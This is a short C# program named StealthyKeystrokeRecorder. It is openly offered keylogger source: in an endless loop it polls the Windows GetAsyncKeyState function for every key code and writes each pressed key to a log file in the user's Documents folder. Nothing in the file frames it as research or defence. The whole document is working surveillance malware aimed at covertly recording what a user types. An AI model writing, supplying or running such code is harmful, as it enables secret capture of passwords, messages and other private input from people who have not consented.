using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;

public class StealthyKeystrokeRecorder {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    public static void Main() {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\log.txt";

        while (true) {
            for (int i = 0; i < 255; i++) {
                int keyState = GetAsyncKeyState(i);
                if (keyState != 0) {
                    File.AppendAllText(path, ((Keys)i).ToString());
                }
            }
        }
    }
}
